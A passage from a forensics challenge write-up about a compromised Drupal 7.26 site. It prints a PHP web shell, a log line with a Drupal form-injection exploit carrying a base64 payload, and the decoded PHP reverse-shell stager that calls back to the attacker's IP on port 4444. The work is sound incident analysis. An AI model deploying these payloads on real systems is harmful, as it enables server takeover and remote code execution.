<p>The exact version number is quite hidden. I searched in some of the config files but couldn&rsquo;t find the exact version number. I finaly tried to explore the themes files, supposing that the exact version number may displayed to compatibility reasons, I was true! Open <code>var/www/html/jabc/themes/bartik/bartik.info</code>:</p>
<pre tabindex="0"><code>; Information added by Drupal.org packaging script on 2014-01-15
version = &#34;7.26&#34;
project = &#34;drupal&#34;
datestamp = &#34;1389815930&#34;
</code></pre><h2 id="q19-which-port-was-listening-to-receive-the-attackers-reverse-shell" class="relative group">Q19. Which port was listening to receive the attacker&rsquo;s reverse shell? <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#q19-which-port-was-listening-to-receive-the-attackers-reverse-shell" aria-label="Ancre">#</a></span></h2>
<p>Firstly, I searched what the attacker did, thanks the Q15, we have the root&rsquo;s user home directory and so its <code>.bash_history</code> file. You could read this:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cd /var/www/html/
</span></span><span style="display:flex;"><span>ll
</span></span><span style="display:flex;"><span>cd jabc
</span></span><span style="display:flex;"><span>ll
</span></span><span style="display:flex;"><span>cat .htaccess 
</span></span><span style="display:flex;"><span>ll
</span></span><span style="display:flex;"><span>vim scripts/update.php
</span></span><span style="display:flex;"><span>ls -lh scripts/
</span></span><span style="display:flex;"><span>w
</span></span><span style="display:flex;"><span>logout 
</span></span></code></pre></div><p>The user go to <code>var/www/html/jabc/</code> and create or modify <code>update.php</code> and logout. Let&rsquo;s open this file:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">system</span>($_GET[<span style="color:#e6db74">&#39;cmd&#39;</span>]);
</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
</span></span></span></code></pre></div><p>If you don&rsquo;t know PHP, this line means that the system will execute the string passed into the URL variable <code>cmd</code>. <strong>This is a reverse shell.</strong></p>
<p>For example an user go on this page: <code>&lt;base url&gt;/update.php?cmd=ls</code> the PHP script will execute <code>system('ls')</code>, which is basically a command line prompt, and so, a backdoor.</p>
<p>In <code>var/log/access.log</code>, the user we can see that an user uses this backdoor (last line):</p>
<pre tabindex="0"><code class="language-log" data-lang="log">192.168.210.131 - - [05/Oct/2019:13:17:54 +0200] &#34;GET /jabc/scripts/update.php?cmd=ls HTTP/1.1&#34; 200 244 &#34;-&#34; &#34;Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0&#34;
</code></pre><p>More interesting, we can see a more offensive access:</p>
<pre tabindex="0"><code>192.168.210.131 - - [05/Oct/2019:13:01:27 +0200] &#34;POST /jabc/?q=user/password&amp;name%5b%23post_render%5d%5b%5d=assert&amp;name%5b%23markup%5d=eval%28base64_decode%28Lyo8P3BocCAvKiovIGVycm9yX3JlcG9ydGluZygwKTsgJGlwID0gJzE5Mi4xNjguMjEwLjEzMSc7ICRwb3J0ID0gNDQ0NDsgaWYgKCgkZiA9ICdzdHJlYW1fc29ja2V0X2NsaWVudCcpICYmIGlzX2NhbGxhYmxlKCRmKSkgeyAkcyA9ICRmKCJ0Y3A6Ly97JGlwfTp7JHBvcnR9Iik7ICRzX3R5cGUgPSAnc3RyZWFtJzsgfSBpZiAoISRzICYmICgkZiA9ICdmc29ja29wZW4nKSAmJiBpc19jYWxsYWJsZSgkZikpIHsgJHMgPSAkZigkaXAsICRwb3J0KTsgJHNfdHlwZSA9ICdzdHJlYW0nOyB9IGlmICghJHMgJiYgKCRmID0gJ3NvY2tldF9jcmVhdGUnKSAmJiBpc19jYWxsYWJsZSgkZikpIHsgJHMgPSAkZihBRl9JTkVULCBTT0NLX1NUUkVBTSwgU09MX1RDUCk7ICRyZXMgPSBAc29ja2V0X2Nvbm5lY3QoJHMsICRpcCwgJHBvcnQpOyBpZiAoISRyZXMpIHsgZGllKCk7IH0gJHNfdHlwZSA9ICdzb2NrZXQnOyB9IGlmICghJHNfdHlwZSkgeyBkaWUoJ25vIHNvY2tldCBmdW5jcycpOyB9IGlmICghJHMpIHsgZGllKCdubyBzb2NrZXQnKTsgfSBzd2l0Y2ggKCRzX3R5cGUpIHsgY2FzZSAnc3RyZWFtJzogJGxlbiA9IGZyZWFkKCRzLCA0KTsgYnJlYWs7IGNhc2UgJ3NvY2tldCc6ICRsZW4gPSBzb2NrZXRfcmVhZCgkcywgNCk7IGJyZWFrOyB9IGlmICghJGxlbikgeyBkaWUoKTsgfSAkYSA9IHVucGFj.aygiTmxlbiIsICRsZW4pOyAkbGVuID0gJGFbJ2xlbiddOyAkYiA9ICcnOyB3aGlsZSAoc3RybGVuKCRiKSA8ICRsZW4pIHsgc3dpdGNoICgkc190eXBlKSB7IGNhc2UgJ3N0cmVhbSc6ICRiIC49IGZyZWFkKCRzLCAkbGVuLXN0cmxlbigkYikpOyBicmVhazsgY2FzZSAnc29ja2V0JzogJGIgLj0gc29ja2V0X3JlYWQoJHMsICRsZW4tc3RybGVuKCRiKSk7IGJyZWFrOyB9IH0gJEdMT0JBTFNbJ21zZ3NvY2snXSA9ICRzOyAkR0xPQkFMU1snbXNnc29ja190eXBlJ10gPSAkc190eXBlOyBpZiAoZXh0ZW5zaW9uX2xvYWRlZCgnc3Vob3NpbicpICYmIGluaV9nZXQoJ3N1aG9zaW4uZXhlY3V0b3IuZGlzYWJsZV9ldmFsJykpIHsgJHN1aG9zaW5fYnlwYXNzPWNyZWF0ZV9mdW5jdGlvbignJywgJGIpOyAkc3Vob3Npbl9ieXBhc3MoKTsgfSBlbHNlIHsgZXZhbCgkYik7IH0gZGllKCk7%29%29%3b&amp;name%5b%23type%5d=markup HTTP/1.1&#34; 200 13983 &#34;-&#34; &#34;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)&#34;
192.168.210.131 - - [05/Oct/2019:13:01:27 +0200] &#34;POST /jabc/?q=file/ajax/name/%23value/form-tggMqwbT3cRyS3SWuIRNGj_FB_5N-cux23-NHVF0NrA HTTP/1.1&#34; 200 1977 &#34;-&#34; &#34;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)&#34;
</code></pre><p>There is a base64 encoded payloads, let&rsquo;s decode it:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#75715e">/*&lt;?php
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">/**/</span> <span style="color:#a6e22e">error_reporting</span>(<span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span>$ip <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;192.168.210.131&#34;</span>;
</span></span><span style="display:flex;"><span>$port <span style="color:#f92672">=</span> <span style="color:#ae81ff">4444</span>;
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (($f <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;stream_socket_client&#34;</span>) <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">is_callable</span>($f)) {
</span></span><span style="display:flex;"><span>    $s <span style="color:#f92672">=</span> $f(<span style="color:#e6db74">&#34;tcp://</span><span style="color:#e6db74">{</span>$ip<span style="color:#e6db74">}</span><span style="color:#e6db74">:</span><span style="color:#e6db74">{</span>$port<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>    $s_type <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;stream&#34;</span>;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>$s <span style="color:#f92672">&amp;&amp;</span> ($f <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;fsockopen&#34;</span>) <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">is_callable</span>($f)) {
</span></span><span style="display:flex;"><span>    $s <span style="color:#f92672">=</span> $f($ip, $port);
</span></span><span style="display:flex;"><span>    $s_type <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;stream&#34;</span>;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>$s <span style="color:#f92672">&amp;&amp;</span> ($f <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;socket_create&#34;</span>) <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">is_callable</span>($f)) {
</span></span><span style="display:flex;"><span>    $s <span style="color:#f92672">=</span> $f(<span style="color:#a6e22e">AF_INET</span>, <span style="color:#a6e22e">SOCK_STREAM</span>, <span style="color:#a6e22e">SOL_TCP</span>);
</span></span><span style="display:flex;"><span>    $res <span style="color:#f92672">=</span> <span style="color:#f92672">@</span><span style="color:#a6e22e">socket_connect</span>($s, $ip, $port);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>$res) {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">die</span>();
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    $s_type <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;socket&#34;</span>;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>$s_type) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#34;no socket funcs&#34;</span>);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>$s) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#34;no socket&#34;</span>);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">switch</span> ($s_type) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> <span style="color:#e6db74">&#34;stream&#34;</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>        $len <span style="color:#f92672">=</span> <span style="color:#a6e22e">fread</span>($s, <span style="color:#ae81ff">4</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> <span style="color:#e6db74">&#34;socket&#34;</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>        $len <span style="color:#f92672">=</span> <span style="color:#a6e22e">socket_read</span>($s, <span style="color:#ae81ff">4</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>$len) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">die</span>();
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>$a <span style="color:#f92672">=</span> <span style="color:#a6e22e">unpack</span>(<span style="color:#e6db74">&#34;Nlen&#34;</span>, $len);
</span></span><span style="display:flex;"><span>$len <span style="color:#f92672">=</span> $a[<span style="color:#e6db74">&#34;len&#34;</span>];
</span></span><span style="display:flex;"><span>$b <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>;
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">while</span> (<span style="color:#a6e22e">strlen</span>($b) <span style="color:#f92672">&lt;</span> $len) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">switch</span> ($s_type) {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">case</span> <span style="color:#e6db74">&#34;stream&#34;</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>            $b <span style="color:#f92672">.=</span> <span style="color:#a6e22e">fread</span>($s, $len <span style="color:#f92672">-</span> <span style="color:#a6e22e">strlen</span>($b));
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">case</span> <span style="color:#e6db74">&#34;socket&#34;</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>            $b <span style="color:#f92672">.=</span> <span style="color:#a6e22e">socket_read</span>($s, $len <span style="color:#f92672">-</span> <span style="color:#a6e22e">strlen</span>($b));
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>$GLOBALS[<span style="color:#e6db74">&#34;msgsock&#34;</span>] <span style="color:#f92672">=</span> $s;
</span></span><span style="display:flex;"><span>$GLOBALS[<span style="color:#e6db74">&#34;msgsock_type&#34;</span>] <span style="color:#f92672">=</span> $s_type;
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">extension_loaded</span>(<span style="color:#e6db74">&#34;suhosin&#34;</span>) <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">ini_get</span>(<span style="color:#e6db74">&#34;suhosin.executor.disable_eval&#34;</span>)) {
</span></span><span style="display:flex;"><span>    $suhosin_bypass <span style="color:#f92672">=</span> <span style="color:#a6e22e">create_function</span>(<span style="color:#e6db74">&#34;&#34;</span>, $b);
</span></span><span style="display:flex;"><span>    $suhosin_bypass();
</span></span><span style="display:flex;"><span>} <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">eval</span>($b);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">die</span>();
</span></span></code></pre></div><p>Let&rsquo;s use ChatGPT to explain this code:</p>
<ol>
<li>
<p>Disables error reporting using <code>error_reporting(0)</code>.</p>
</li>
<li>
<p>Tries to create a stream connection with the specified IP address and port using different available functions. The tested functions are: <code>stream_socket_client</code>, <code>fsockopen</code>, and <code>socket_create</code>.</p>
</li>
<li>
<p>If the connection fails with all tested functions, the script terminates by displaying &ldquo;no socket funcs&rdquo; or &ldquo;no socket,&rdquo; depending on the case.</p>
</li>
<li>
<p>If a connection succeeds, the script reads the first 4 bytes from the connection, which are assumed to represent the length of the data to receive.</p>
</li>
<li>
<p>The data is then read from the connection in several steps to reach the total length indicated by the initial 4 bytes.</p>
</li>
<li>
<p>Once the complete data is read, the evaluated code is executed using the eval function.</p>
</li>
<li>
<p>Before executing the evaluated code, the code checks if the &ldquo;suhosin&rdquo; extension is loaded and if the &ldquo;suhosin.executor.disable_eval&rdquo; configuration is enabled. If so, the code dynamically creates a function to bypass this restriction.</p>
</li>
<li>
<p>The code terminates after executing the evaluated code.</p>
</li>
</ol>
<p>mode GPT off.</p>
<p>Le &rsquo;evaluated code&rsquo; is the socket content; what the attackers wants to execute remotely. In this code we have the port used by the attacker!</p>

      </div>
    </section>
    <footer class="pt-8 max-w-prose print:hidden">
      
  <div class="flex">
    
      
      
        
        <img
          class="w-24 h-24 !mt-0 !mb-0 ltr:mr-4 rtl:ml-4 rounded-full"
          width="96"
          height="96"
          alt="nathan.out"
          src="/img/author_hu00bba01d950a59fc7877b060fc60a3bd_21567_192x192_fill_q75_box_smart1.jpg"
        />
      
    
    <div class="place-self-center">
      
        <div class="text-[0.6rem] leading-3 text-neutral-500 dark:text-neutral-400 uppercase">
          Auteur
        </div>
        <div class="font-semibold leading-6 text-neutral-800 dark:text-neutral-300">
          nathan.out
        </div>
      
      
      <div class="text-2xl sm:text-lg">
  <div class="flex flex-wrap text-neutral-400 dark:text-neutral-500">
    
      
        <a
          class="px-1 hover:text-primary-700 dark:hover:text-primary-400"
          href="https://github.com/nathan-out"
          target="_blank"
          aria-label="Github"
          rel="me noopener noreferrer"
          >

  <span class="relative inline-block align-text-bottom icon">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><path fill="currentColor" d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg>

  </span>

</a
        >
      
    
  </div>

</div>
    </div>
  </div>


      

      
  
    
    
    
    <div class="pt-8">
      <hr class="border-dotted border-neutral-300 dark:border-neutral-600" />
      <div class="flex justify-between pt-3">
        <span>
          
            <a class="flex group" href="/write-up/cyberdefenders-digital-forensic-hireme/">
              <span
                class="mr-3 ltr:inline rtl:hidden text-neutral-700 dark:text-neutral group-hover:text-primary-600 dark:group-hover:text-primary-400"
                >&larr;</span
              >
              <span
                class="ml-3 ltr:hidden rtl:inline text-neutral-700 dark:text-neutral group-hover:text-primary-600 dark:group-hover:text-primary-400"
                >&rarr;</span
              >
              <span class="flex flex-col">
                <span
                  class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500"
                  >Cyberdefenders · Digital Forensic · Hireme</span
                >
                <span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400">
                  
                    <time datetime="2023-08-12 11:18:44 &#43;0300 &#43;0300">12 août 2023</time>
                  
                </span>
              </span>
            </a>
          
        </span>
        <span>
          
            <a class="flex text-right group" href="/write-up/cyberdefenders-digital-forensic-african-falls/">
              <span class="flex flex-col">
                <span
                  class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500"
                  >Cyberdefenders · Digital Forensic · African Falls</span
                >
                <span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400">
                  
                    <time datetime="2023-08-12 11:22:06 &#43;0300 &#43;0300">12 août 2023</time>
                  
                </span>
              </span>
              <span
                class="ml-3 ltr:inline rtl:hidden text-neutral-700 dark:text-neutral group-hover:text-primary-600 dark:group-hover:text-primary-400"
                >&rarr;</span
              >
              <span
                class="mr-3 ltr:hidden rtl:inline text-neutral-700 dark:text-neutral group-hover:text-primary-600 dark:group-hover:text-primary-400"
                >&larr;</span
              >
            </a>
          
        </span>
      </div>
    </div>
  


      
    </footer>
  </article>

        
          <div
            class="absolute top-[100vh] ltr:right-0 rtl:left-0 w-12 pointer-events-none bottom-0"
          >
            <a
              href="#the-top"
              class="w-12 h-12 sticky pointer-events-auto top-[calc(100vh-5.5rem)] bg-neutral/50 dark:bg-neutral-800/50 backdrop-blur rounded-full text-xl flex items-center justify-center text-neutral-700 dark:text-neutral hover:text-primary-600 dark:hover:text-primary-400"
              aria-label="Faire défiler jusqu&#39;au bas de la page"
              title="Faire défiler jusqu&#39;au bas de la page"
            >
              &uarr;
            </a>
          </div>
        
      </main><footer class="py-10 print:hidden">
  
  
  <div class="flex items-center justify-between">
    <div>
      
      
        <p class="text-sm text-neutral-500 dark:text-neutral-400">
            &copy;
            2023
            nathan.out
        </p>
      
      
      
    </div>
    
    
      <div
        class="text-sm cursor-pointer text-neutral-700 dark:text-neutral hover:text-primary-600 dark:hover:text-primary-400 ltr:mr-14 rtl:ml-14"
      >
        <button
          id="appearance-switcher"
          class="w-12 h-12 "
          type="button"
          title="Passer au thème sombre"
        >
          <span class="inline dark:hidden">

  <span class="relative inline-block align-text-bottom icon">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M32 256c0-123.8 100.3-224 223.8-224c11.36 0 29.7 1.668 40.9 3.746c9.616 1.777 11.75 14.63 3.279 19.44C245 86.5 211.2 144.6 211.2 207.8c0 109.7 99.71 193 208.3 172.3c9.561-1.805 16.28 9.324 10.11 16.95C387.9 448.6 324.8 480 255.8 480C132.1 480 32 379.6 32 256z"/></svg>

  </span>

</span>
          <span class="hidden dark:inline">

  <span class="relative inline-block align-text-bottom icon">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M256 159.1c-53.02 0-95.1 42.98-95.1 95.1S202.1 351.1 256 351.1s95.1-42.98 95.1-95.1S309 159.1 256 159.1zM509.3 347L446.1 255.1l63.15-91.01c6.332-9.125 1.104-21.74-9.826-23.72l-109-19.7l-19.7-109c-1.975-10.93-14.59-16.16-23.72-9.824L256 65.89L164.1 2.736c-9.125-6.332-21.74-1.107-23.72 9.824L121.6 121.6L12.56 141.3C1.633 143.2-3.596 155.9 2.736 164.1L65.89 256l-63.15 91.01c-6.332 9.125-1.105 21.74 9.824 23.72l109 19.7l19.7 109c1.975 10.93 14.59 16.16 23.72 9.824L256 446.1l91.01 63.15c9.127 6.334 21.75 1.107 23.72-9.822l19.7-109l109-19.7C510.4 368.8 515.6 356.1 509.3 347zM256 383.1c-70.69 0-127.1-57.31-127.1-127.1c0-70.69 57.31-127.1 127.1-127.1s127.1 57.3 127.1 127.1C383.1 326.7 326.7 383.1 256 383.1z"/></svg>

  </span>

</span>
        </button>
      </div>
    
  </div>
  
  
</footer>
<div
  id="search-wrapper"
  class="fixed inset-0 z-50 flex flex-col p-4 sm:p-6 md:p-[10vh] lg:p-[12vh] w-screen h-screen cursor-default bg-neutral-500/50 backdrop-blur-sm dark:bg-neutral-900/50 invisible"
  data-url="https://nathan-out.github.io/"
>
  <div
    id="search-modal"
    class="flex flex-col w-full max-w-3xl min-h-0 mx-auto border rounded-md shadow-lg border-neutral-200 top-20 bg-neutral dark:bg-neutral-800 dark:border-neutral-700"
  >
    <header class="relative z-10 flex items-center justify-between flex-none px-2">
      <form class="flex items-center flex-auto min-w-0">
        <div class="flex items-center justify-center w-8 h-8 text-neutral-400">
          

  <span class="relative inline-block align-text-bottom icon">
    <svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>

  </span>


        </div>
        <input
          type="search"
          id="search-query"
          class="flex flex-auto h-12 mx-1 bg-transparent appearance-none focus:outline-dotted focus:outline-transparent focus:outline-2"
          placeholder="Rechercher"
          tabindex="0"
        />
      </form>
      <button
        id="close-search-button"
        class="flex items-center justify-center w-8 h-8 text-neutral-700 dark:text-neutral hover:text-primary-600 dark:hover:text-primary-400"
        title="Fermer (Esc)"
      >
        

  <span class="relative inline-block align-text-bottom icon">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75 0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3L54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75 0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75 0-45.25s32.75-12.5 45.25 0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25 0s12.5 32.75 0 45.25l-105.4 105.4L310.6 361.4z"/></svg>

  </span>


      </button>
    </header>
    <section class="flex-auto px-2 overflow-auto">
      <ul id="search-results">
        
      </ul>
    </section>
  </div>
</div>

    </div>
  </body>
</html>
